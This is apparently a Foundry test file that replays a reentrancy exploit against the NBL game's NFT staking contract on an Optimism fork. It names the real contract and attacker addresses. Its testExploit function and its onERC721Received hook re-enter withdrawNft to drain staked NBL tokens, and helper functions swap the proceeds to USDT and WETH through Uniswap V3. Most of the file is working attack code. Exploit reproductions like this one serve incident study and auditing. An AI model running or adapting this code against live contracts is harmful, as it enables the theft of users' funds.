// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV3.sol";
import "@interface/IERC721.sol";

import "./INblNftStake.sol";

IERC721 constant NblBoxNft = IERC721(
    0x534e1a8a89548C44BE7abA1c3c27951801940C10
);
IERC20 constant NBL = IERC20(0x4B03afC91295ed778320c2824bAd5eb5A1d852DD);
IERC20 constant USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
IERC20 constant WETH = IERC20(0x4200000000000000000000000000000000000006);
IUniswapV3Pool constant NBL_USDT = IUniswapV3Pool(
    0xfAF037caAfA9620bFAebc04C298Bf4A104963613
);
ISwapRouter02 constant UniV3Router = ISwapRouter02(
    payable(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45)
);
INblNftStake constant NblNftStake = INblNftStake(
    0x5499178919C79086fd580d6c5f332a4253244D91
);

contract NblGameTest is Test {
    bool private reenter = true;
    uint256 loanAmount;
    uint256 NFT_ID = 737;

    function setUp() public {
        vm.createSelectFork("optimism", 115293068);
        vm.label(address(NblBoxNft), "NblBoxNft");
        vm.label(address(NBL), "NBL");
        vm.label(address(USDT), "USDT");
        vm.label(address(WETH), "WETH");
        vm.label(address(NBL_USDT), "NBL_USDT");
        vm.label(address(UniV3Router), "UniV3Router");
        vm.label(address(NblNftStake), "NblNftStake");

        // Transfering NblBoxNft NFT token (id = 737) from main attack contract to helper attack contract which will be exploiting reentrancy vulnerability
        vm.prank(
            0xE4D41BDD6459198B33Cc795ff280cEE02d91087b,
            0x1FD0a6A5e232EebA8020A40535AD07013Ec4ef12
        );
        NblBoxNft.transferFrom(
            0xE4D41BDD6459198B33Cc795ff280cEE02d91087b,
            address(this),
            NFT_ID
        );
        assertEq(NblBoxNft.ownerOf(NFT_ID), address(this));

        deal(address(NBL), address(this), 1773100000 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        USDT.approve(address(UniV3Router), type(uint256).max);
        USDT.approve(address(NblNftStake), type(uint256).max);
        NBL.approve(address(UniV3Router), type(uint256).max);
        NBL.approve(address(NblNftStake), type(uint256).max);
        NblBoxNft.setApprovalForAll(address(NblNftStake), true);

        // print("USDT balance before", USDT.balanceOf(address(this)), 6);
        // print("WETH balance before", WETH.balanceOf(address(this)), 18);

        NblNftStake.unlockSlot();
        NblNftStake.depositNft(NFT_ID, 0);
        NblNftStake.depositNbl(0, NBL.balanceOf(address(this)));
        NblNftStake.withdrawNft(0);

        print("NBL balance before", NBL.balanceOf(address(this)), 18);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        operator;
        from;
        tokenId;
        data;
        if (reenter) {
            reenter = false;
            NblBoxNft.transferFrom(address(this), address(NblNftStake), NFT_ID);
            NblNftStake.withdrawNft(0);
            // 为了恢复stakes[_index]数据 否则最外层withdrawNft不能执行成功
            NblNftStake.depositNft(NFT_ID, 0);
        }
        return this.onERC721Received.selector;
    }

    function NBLToUSDT() internal {
        IV3SwapRouter.ExactInputSingleParams memory params = IV3SwapRouter
            .ExactInputSingleParams({
                tokenIn: address(NBL),
                tokenOut: address(USDT),
                fee: 3_000,
                recipient: address(this),
                amountIn: (NBL.balanceOf(address(this)) * 9) / 10,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        UniV3Router.exactInputSingle(params);
    }

    function NBLToWETH() internal {
        IV3SwapRouter.ExactInputSingleParams memory params = IV3SwapRouter
            .ExactInputSingleParams({
                tokenIn: address(NBL),
                tokenOut: address(WETH),
                fee: 3_000,
                recipient: address(this),
                amountIn: NBL.balanceOf(address(this)),
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        UniV3Router.exactInputSingle(params);
    }
}
